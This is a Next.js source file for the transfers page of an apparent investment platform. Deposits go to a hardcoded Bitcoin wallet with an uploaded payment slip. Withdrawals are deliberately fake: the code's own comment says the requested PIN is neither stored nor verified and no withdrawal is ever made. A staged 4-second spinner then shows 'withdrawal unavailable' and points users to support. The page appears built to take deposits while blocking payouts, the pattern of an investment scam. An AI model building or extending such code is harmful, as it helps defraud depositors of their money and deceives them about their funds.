
"use client";

import { useEffect, useState } from "react";
import { useRouter } from "next/navigation";
import { createClient } from "@/lib/supabase/client";
import type { User } from "@supabase/supabase-js";

type TransferType = "deposit" | "withdraw";

const DEPOSIT_WALLET_ADDRESS =
  "bc1qwx90w9s588gyev4qrw45fe57gq5pwrhctte8f2";

export default function TransfersPage() {
  const router = useRouter();

  const [user, setUser] = useState<User | null>(null);
  const [loading, setLoading] = useState(true);

  const [type, setType] = useState<TransferType>("deposit");
  const [amount, setAmount] = useState("");

  const [balance, setBalance] = useState(0);

  const [showDeposit, setShowDeposit] = useState(false);
  const [copied, setCopied] = useState(false);

  const [paymentSlip, setPaymentSlip] = useState<File | null>(null);
  const [paymentSubmitted, setPaymentSubmitted] = useState(false);

  const [processing, setProcessing] = useState(false);
  const [message, setMessage] = useState("");

  // Withdrawal-only state
  const [showPin, setShowPin] = useState(false);
  const [pin, setPin] = useState("");
  const [withdrawalUnavailable, setWithdrawalUnavailable] =
    useState(false);

  useEffect(() => {
    const supabase = createClient();

    const loadAccount = async () => {
      const {
        data: { user },
      } = await supabase.auth.getUser();

      if (!user) {
        router.replace("/login");
        return;
      }

      setUser(user);

      const { data, error } = await supabase
        .from("cash_balances")
        .select("available_balance")
        .eq("user_id", user.id)
        .eq("currency", "USD")
        .maybeSingle();

      if (error) {
        console.error("Balance error:", error);
      }

      setBalance(Number(data?.available_balance ?? 0));
      setLoading(false);
    };

    loadAccount();
  }, [router]);

  const numericAmount = Number(amount) || 0;

  const formattedBalance = new Intl.NumberFormat("en-US", {
    style: "currency",
    currency: "USD",
    minimumFractionDigits: 2,
    maximumFractionDigits: 2,
  }).format(balance);

  const formattedAmount = new Intl.NumberFormat("en-US", {
    style: "currency",
    currency: "USD",
    minimumFractionDigits: 2,
    maximumFractionDigits: 2,
  }).format(numericAmount);

  const canContinue =
    numericAmount > 0 &&
    !processing &&
    (type === "deposit" || numericAmount <= balance);

  const copyDepositAddress = async () => {
    try {
      await navigator.clipboard.writeText(
        DEPOSIT_WALLET_ADDRESS
      );

      setCopied(true);

      setTimeout(() => {
        setCopied(false);
      }, 2000);
    } catch (error) {
      console.error("Copy wallet address error:", error);

      setMessage(
        "Unable to copy the wallet address. Please copy it manually."
      );
    }
  };

  const handleContinue = async () => {
    setMessage("");

    if (numericAmount <= 0) {
      setMessage("Enter a valid amount.");
      return;
    }

    if (type === "deposit") {
      setShowDeposit(true);
      return;
    }

    if (numericAmount > balance) {
      setMessage("Insufficient available balance.");
      return;
    }

    // Withdrawal only:
    // Do not process the withdrawal.
    // Show the 4-digit PIN input instead.
    setShowPin(true);
    setPin("");
    setWithdrawalUnavailable(false);
    setMessage("");
  };

 const handlePinSubmit = async () => {
  if (pin.length !== 4) {
    setMessage("Enter your 4-digit security PIN.");
    return;
  }

  /*
    There is currently no PIN/security credential system
    connected to the application.

    Therefore:
    - The PIN is NOT stored.
    - The PIN is NOT verified.
    - No withdrawal is created.
    - No balance is deducted.
    - No transaction is processed.

    The confirmation button will remain in a loading
    state for 4 seconds before showing withdrawal
    as unavailable.
  */

  setProcessing(true);
  setMessage("");

  await new Promise((resolve) =>
    setTimeout(resolve, 4000)
  );

  setProcessing(false);
  setPin("");
  setShowPin(false);
  setWithdrawalUnavailable(true);
};

  const handlePaymentSlipSubmit = async () => {
    if (paymentSubmitted) {
      setMessage(
        "This deposit has already been submitted for review."
      );
      return;
    }

    if (!user) {
      setMessage("Please sign in again.");
      return;
    }

    if (!paymentSlip) {
      setMessage("Please upload your payment slip.");
      return;
    }

    if (numericAmount <= 0) {
      setMessage("Enter a valid deposit amount.");
      return;
    }

    setProcessing(true);
    setMessage("");

    try {
      const supabase = createClient();

      const fileExtension =
        paymentSlip.name.split(".").pop()?.toLowerCase() ||
        "file";

      const filePath = `${user.id}/${crypto.randomUUID()}.${fileExtension}`;

      const { error: uploadError } = await supabase.storage
        .from("payment-slips")
        .upload(filePath, paymentSlip, {
          cacheControl: "3600",
          upsert: false,
        });

      if (uploadError) {
        console.error(
          "Deposit slip upload error:",
          uploadError
        );

        setMessage(
          "Unable to upload the payment slip. Please try again."
        );

        setProcessing(false);
        return;
      }

      const { error: requestError } = await supabase
        .from("crypto_payment_requests")
        .insert({
          user_id: user.id,
          asset_symbol: "BTC",
          side: "buy",
          quantity: 0,
          price: 0,
          estimated_total: numericAmount,
          payment_address: DEPOSIT_WALLET_ADDRESS,
          payment_slip_path: filePath,
          status: "pending",
        });

      if (requestError) {
        console.error(
          "Deposit request error:",
          requestError
        );

        setMessage(
          "The payment slip was uploaded, but the deposit request could not be created. Please contact support."
        );

        setProcessing(false);
        return;
      }

      setPaymentSubmitted(true);
      setProcessing(false);

      setMessage(
        "Deposit submitted for review. Your account balance will remain unchanged until the payment is verified."
      );
    } catch (error) {
      console.error(
        "Deposit submission error:",
        error
      );

      setMessage(
        "Unable to submit the deposit. Please try again."
      );

      setProcessing(false);
    }
  };

  if (loading) {
    return (
      <main className="flex min-h-screen items-center justify-center bg-[#f5f7f3]">
        <p className="text-sm text-[#68736b]">
          Loading transfers...
        </p>
      </main>
    );
  }

  return (
    <main className="min-h-screen bg-[#f5f7f3] text-[#111613]">
      {/* HEADER */}
      <header className="sticky top-0 z-30 border-b border-[#dfe5df] bg-[#f5f7f3]/90 backdrop-blur">
        <div className="mx-auto flex h-[76px] max-w-[1500px] items-center justify-between px-5 sm:px-7 lg:px-9">
          <div className="flex items-center gap-3">
            <button
              type="button"
              onClick={() => router.push("/account")}
              className="flex h-10 w-10 items-center justify-center rounded-xl border border-[#dfe5df] bg-white text-[#68736b] hover:text-[#111613]"
              aria-label="Back"
            >
              ←
            </button>

            <div>
              <p className="text-[9px] uppercase tracking-[0.15em] text-[#9aa39d]">
                Investment workspace
              </p>

              <h1 className="mt-1 text-xl font-semibold tracking-[-0.03em]">
                Transfers
              </h1>
            </div>
          </div>

          <button
            type="button"
            onClick={() =>
              router.push("/account/settings")
            }
            className="flex h-10 w-10 items-center justify-center rounded-xl bg-[#111613] text-xs font-bold text-white"
            title={user?.email ?? "Account"}
          >
            {(
              user?.user_metadata?.full_name ||
              user?.user_metadata?.name ||
              user?.email ||
              "U"
            )
              .charAt(0)
              .toUpperCase()}
          </button>
        </div>
      </header>

      {/* CONTENT */}
      <section className="mx-auto max-w-[1100px] px-5 py-8 sm:px-7 lg:px-9">
        <div>
          <p className="text-sm text-[#7b857e]">
            Move funds into or out of your investment account.
          </p>

          <h2 className="mt-1 text-[30px] font-semibold tracking-[-0.04em]">
            Move money
          </h2>
        </div>

        <div className="mt-7 grid gap-5 lg:grid-cols-[minmax(0,1fr)_360px]">
          {/* TRANSFER FORM */}
          <section className="rounded-3xl border border-[#dfe5df] bg-white p-6 shadow-[0_15px_45px_rgba(20,35,25,0.05)]">
            {/* TABS */}
            <div className="grid grid-cols-2 rounded-xl bg-[#f5f7f3] p-1">
              <button
                type="button"
                onClick={() => {
                  setType("deposit");
                  setAmount("");
                  setMessage("");
                  setShowDeposit(true);
                  setPaymentSlip(null);
                  setPaymentSubmitted(false);
                  setProcessing(false);

                  // Reset withdrawal-only state
                  setShowPin(false);
                  setPin("");
                  setWithdrawalUnavailable(false);
                }}
                className={`rounded-lg py-3 text-xs font-semibold ${
                  type === "deposit"
                    ? "bg-white text-[#16805a] shadow-sm"
                    : "text-[#7d877f]"
                }`}
              >
                Deposit
              </button>

              <button
                type="button"
                onClick={() => {
                  setType("withdraw");
                  setAmount("");
                  setMessage("");
                  setShowDeposit(false);
                  setPaymentSlip(null);
                  setPaymentSubmitted(false);
                  setProcessing(false);

                  // Withdrawal-only state
                  setShowPin(false);
                  setPin("");
                  setWithdrawalUnavailable(false);
                }}
                className={`rounded-lg py-3 text-xs font-semibold ${
                  type === "withdraw"
                    ? "bg-white text-[#111613] shadow-sm"
                    : "text-[#7d877f]"
                }`}
              >
                Withdraw
              </button>
            </div>

            {/* BALANCE */}
            <div className="mt-7 rounded-2xl border border-[#edf0ed] bg-[#fbfcfa] p-4">
              <p className="text-[9px] uppercase tracking-[0.12em] text-[#929b95]">
                Available cash
              </p>

              <p className="mt-2 text-2xl font-semibold">
                {formattedBalance}
              </p>
            </div>

            {/* AMOUNT */}
            <div className="mt-6">
              <label className="text-xs font-semibold">
                {type === "deposit"
                  ? "Deposit amount"
                  : "Withdrawal amount"}
              </label>

              <div className="mt-2 flex items-center rounded-2xl border border-[#dfe5df] bg-[#fbfcfa] px-4 focus-within:border-[#16805a] focus-within:ring-4 focus-within:ring-[#16805a]/10">
                <span className="text-sm font-semibold text-[#8b948e]">
                  $
                </span>

                <input
                  type="number"
                  min="0"
                  step="0.01"
                  value={amount}
                  disabled={
                    processing ||
                    paymentSubmitted ||
                    showPin
                  }
                  onChange={(e) => {
                    setAmount(e.target.value);
                    setMessage("");
                    setWithdrawalUnavailable(false);
                  }}
                  placeholder="0.00"
                  className="h-14 min-w-0 flex-1 bg-transparent px-3 text-2xl font-semibold outline-none placeholder:text-[#c5cbc6] disabled:cursor-not-allowed disabled:opacity-50"
                />

                <span className="text-xs font-semibold text-[#727c75]">
                  USD
                </span>
              </div>
            </div>

            {/* QUICK AMOUNTS */}
            <div className="mt-4 flex flex-wrap gap-2">
              {[100, 500, 1000, 5000].map((value) => (
                <button
                  key={value}
                  type="button"
                  disabled={
                    processing ||
                    paymentSubmitted ||
                    showPin
                  }
                  onClick={() => {
                    setAmount(value.toString());
                    setMessage("");
                    setWithdrawalUnavailable(false);
                  }}
                  className="rounded-lg border border-[#dfe5df] bg-white px-3 py-2 text-[10px] font-medium text-[#68736b] hover:bg-[#f5f7f3] disabled:cursor-not-allowed disabled:opacity-50"
                >
                  ${value.toLocaleString()}
                </button>
              ))}
            </div>

            {/* DEPOSIT PAYMENT PANEL */}
            {type === "deposit" && showDeposit && (
              <div className="mt-6 rounded-2xl border border-[#dfe5df] bg-[#f8faf7] p-5">
                <p className="text-sm font-semibold">
                  Complete your deposit
                </p>

                <p className="mt-2 text-[10px] leading-5 text-[#718078]">
                  Send your payment to the Bitcoin wallet
                  address below. Copy the address carefully
                  before making your transaction.
                </p>

                <div className="mt-4 rounded-xl border border-[#dfe5df] bg-white p-4">
                  <p className="break-all text-[11px] font-medium leading-6 text-[#4f5a52]">
                    {DEPOSIT_WALLET_ADDRESS}
                  </p>
                </div>

                <button
                  type="button"
                  onClick={copyDepositAddress}
                  disabled={paymentSubmitted}
                  className="mt-3 w-full rounded-xl border border-[#dfe5df] bg-white px-4 py-3 text-xs font-semibold text-[#111613] transition hover:bg-[#f5f7f3] disabled:cursor-not-allowed disabled:opacity-60"
                >
                  {copied
                    ? "Copied ✓"
                    : "Copy wallet address"}
                </button>

                {!paymentSubmitted && (
                  <>
                    <div className="mt-5">
                      <label
                        htmlFor="deposit-payment-slip"
                        className="text-xs font-semibold"
                      >
                        Upload payment slip
                      </label>

                      <input
                        id="deposit-payment-slip"
                        type="file"
                        accept="image/*,.pdf"
                        onChange={(e) =>
                          setPaymentSlip(
                            e.target.files?.[0] ?? null
                          )
                        }
                        className="mt-2 block w-full rounded-xl border border-[#dfe5df] bg-white px-3 py-3 text-xs text-[#68736b] file:mr-3 file:rounded-lg file:border-0 file:bg-[#f5f7f3] file:px-3 file:py-2 file:text-xs file:font-semibold file:text-[#111613]"
                      />

                      {paymentSlip && (
                        <p className="mt-2 break-all text-[10px] text-[#68736b]">
                          Selected: {paymentSlip.name}
                        </p>
                      )}
                    </div>

                    <button
                      type="button"
                      disabled={
                        processing || !paymentSlip
                      }
                      onClick={handlePaymentSlipSubmit}
                      className="mt-5 h-12 w-full rounded-xl bg-[#16805a] text-sm font-semibold text-white transition hover:bg-[#126d4d] disabled:cursor-not-allowed disabled:opacity-40"
                    >
                      {processing
                        ? "Submitting..."
                        : "Submit payment slip"}
                    </button>
                  </>
                )}

                {paymentSubmitted && (
                  <div className="mt-5 rounded-xl border border-[#cfe1d5] bg-[#eef7f1] px-4 py-4 text-center">
                    <p className="text-sm font-semibold text-[#16805a]">
                      Deposit submitted for review
                    </p>

                    <p className="mt-2 text-[10px] leading-5 text-[#68736b]">
                      Your payment slip has been received.
                      Your account balance will remain
                      unchanged until the deposit is
                      reviewed and verified.
                    </p>
                  </div>
                )}
              </div>
            )}

            {/* WITHDRAWAL PIN PANEL */}
            {type === "withdraw" && showPin && (
              <div className="mt-6 rounded-2xl border border-[#dfe5df] bg-[#f8faf7] p-5">
                <div className="text-center">
                  <div className="mx-auto flex h-11 w-11 items-center justify-center rounded-full bg-[#eaf6ef] text-[#16805a]">
                    <LockIcon />
                  </div>

                  <p className="mt-4 text-sm font-semibold">
                    Confirm withdrawal
                  </p>

                  <p className="mt-2 text-[10px] leading-5 text-[#718078]">
                    Enter your 4-digit security PIN to
                    continue with this withdrawal.
                  </p>
                </div>

                <div className="mt-5">
                  <label
                    htmlFor="withdrawal-pin"
                    className="text-xs font-semibold"
                  >
                    Security PIN
                  </label>

                  <input
                    id="withdrawal-pin"
                    type="password"
                    inputMode="numeric"
                    autoComplete="off"
                    maxLength={4}
                    value={pin}
                    onChange={(e) => {
                      const value = e.target.value
                        .replace(/\D/g, "")
                        .slice(0, 4);

                      setPin(value);
                      setMessage("");
                    }}
                    placeholder="••••"
                    className="mt-2 h-14 w-full rounded-xl border border-[#dfe5df] bg-white px-4 text-center text-xl font-semibold tracking-[0.45em] outline-none transition focus:border-[#16805a] focus:ring-4 focus:ring-[#16805a]/10"
                  />

                  <p className="mt-2 text-center text-[9px] text-[#929b95]">
                    Enter exactly 4 digits.
                  </p>
                </div>

                <div className="mt-5 grid grid-cols-2 gap-3">
                  <button
                    type="button"
                    onClick={() => {
                      setShowPin(false);
                      setPin("");
                      setMessage("");
                    }}
                    className="h-11 rounded-xl border border-[#dfe5df] bg-white text-xs font-semibold text-[#68736b] transition hover:text-[#111613]"
                  >
                    Back
                  </button>

                  <button
                    type="button"
                    disabled={pin.length !== 4}
                    onClick={handlePinSubmit}
                    className="h-11 rounded-xl bg-[#111613] text-xs font-semibold text-white transition hover:bg-[#16805a] disabled:cursor-not-allowed disabled:opacity-40"
                  >
                    Confirm PIN
                  </button>
                </div>
              </div>
            )}

            {/* WITHDRAWAL UNAVAILABLE */}
            {type === "withdraw" &&
              withdrawalUnavailable && (
                <div className="mt-6 rounded-2xl border border-red-200 bg-red-50 p-5">
                  <div className="flex items-start gap-3">
                    <div className="flex h-10 w-10 shrink-0 items-center justify-center rounded-full bg-white">
                      <AlertIcon />
                    </div>

                    <div>
                      <p className="text-sm font-semibold text-[#303731]">
                        Withdrawal unavailable
                      </p>

                      <p className="mt-2 text-[10px] leading-5 text-[#68736b]">
                        Withdrawals are currently
                        unavailable. Please contact customer
                        support for assistance with your
                        withdrawal request.
                      </p>
                    </div>
                  </div>

                  <button
                    type="button"
                    onClick={() =>
                      router.push("/account/support")
                    }
                    className="mt-5 h-11 w-full rounded-xl bg-[#111613] text-xs font-semibold text-white transition hover:bg-[#16805a]"
                  >
                    Customer Support
                  </button>

                  <button
                    type="button"
                    onClick={() => {
                      setWithdrawalUnavailable(false);
                      setPin("");
                      setAmount("");
                      setMessage("");
                    }}
                    className="mt-3 h-11 w-full rounded-xl border border-[#dfe5df] bg-white text-xs font-semibold text-[#68736b] transition hover:text-[#111613]"
                  >
                    Try another withdrawal
                  </button>
                </div>
              )}

            {/* MESSAGE */}
            {message && (
              <div
                className={`mt-5 rounded-xl border px-4 py-3 text-xs leading-5 ${
                  message.includes("failed")
                    ? "border-red-200 bg-red-50 text-red-700"
                    : message.includes("Processing")
                      ? "border-[#dfe5df] bg-[#f5f7f3] text-[#68736b]"
                      : message.includes("unavailable") ||
                          message.includes("Insufficient")
                        ? "border-red-200 bg-red-50 text-red-700"
                        : "border-[#cfe1d4] bg-[#edf7f0] text-[#16805a]"
                }`}
              >
                {message}
              </div>
            )}

            {/* CONTINUE WITHDRAWAL */}
            {type === "withdraw" &&
              !showPin &&
              !withdrawalUnavailable && (
                <button
                  type="button"
                  disabled={!canContinue}
                  onClick={handleContinue}
                  className="mt-6 h-12 w-full rounded-xl bg-[#111613] text-sm font-semibold text-white transition hover:bg-[#1b241f] disabled:cursor-not-allowed disabled:opacity-40"
                >
                  Continue withdrawal
                </button>
              )}

            {/* DEPOSIT PROCESSING
                This remains for the existing deposit flow. */}
            {type === "deposit" && processing && (
              <div className="mt-6 flex items-center justify-center gap-3 rounded-xl border border-[#dfe5df] bg-[#f8faf7] px-4 py-4">
                <div className="h-4 w-4 animate-spin rounded-full border-2 border-[#dfe5df] border-t-[#111613]" />

                <span className="text-xs text-[#68736b]">
                  Processing your deposit...
                </span>
              </div>
            )}
          </section>

          {/* SUMMARY */}
          <aside className="space-y-5">
            <section className="rounded-3xl border border-[#dfe5df] bg-white p-6 shadow-[0_12px_35px_rgba(20,35,25,0.04)]">
              <p className="text-xs text-[#89928b]">
                Transfer summary
              </p>

              <h3 className="mt-1 text-lg font-semibold">
                {type === "deposit"
                  ? "Deposit funds"
                  : "Withdraw funds"}
              </h3>

              <div className="mt-6 space-y-4">
                <SummaryRow
                  label="Method"
                  value={
                    type === "deposit"
                      ? "Bitcoin wallet"
                      : "Account balance"
                  }
                />

                <SummaryRow
                  label="Currency"
                  value="USD"
                />

                <SummaryRow
                  label="Amount"
                  value={formattedAmount}
                />

                <div className="border-t border-[#edf0ed] pt-4">
                  <SummaryRow
                    label={
                      type === "deposit"
                        ? "Balance after deposit"
                        : "Balance after withdrawal"
                    }
                    value={new Intl.NumberFormat(
                      "en-US",
                      {
                        style: "currency",
                        currency: "USD",
                        minimumFractionDigits: 2,
                        maximumFractionDigits: 2,
                      }
                    ).format(
                      type === "deposit"
                        ? balance + numericAmount
                        : balance - numericAmount
                    )}
                  />
                </div>
              </div>
            </section>

           
          </aside>
        </div>
      </section>
    </main>
  );
}

function SummaryRow({
  label,
  value,
}: {
  label: string;
  value: string;
}) {
  return (
    <div className="flex items-center justify-between gap-4">
      <span className="text-xs text-[#7b857e]">
        {label}
      </span>

      <span className="text-xs font-semibold">
        {value}
      </span>
    </div>
  );
}

function LockIcon() {
  return (
    <svg
      width="18"
      height="18"
      viewBox="0 0 24 24"
      fill="none"
    >
      <rect
        x="5"
        y="10"
        width="14"
        height="10"
        rx="2"
        stroke="currentColor"
        strokeWidth="1.7"
      />

      <path
        d="M8 10V7a4 4 0 018 0v3"
        stroke="currentColor"
        strokeWidth="1.7"
        strokeLinecap="round"
      />
    </svg>
  );
}

function AlertIcon() {
  return (
    <svg
      width="18"
      height="18"
      viewBox="0 0 24 24"
      fill="none"
    >
      <path
        d="M12 8v4"
        stroke="#c65b5b"
        strokeWidth="1.8"
        strokeLinecap="round"
      />

      <circle
        cx="12"
        cy="16"
        r="1"
        fill="#c65b5b"
      />

      <path
        d="M10.3 4.7L3.6 16.2c-.8 1.4.2 3.2 1.8 3.2h13.2c1.6 0 2.6-1.8 1.8-3.2L13.7 4.7c-.8-1.4-2.6-1.4-3.4 0z"
        stroke="#c65b5b"
        strokeWidth="1.5"
      />
    </svg>
  );
}
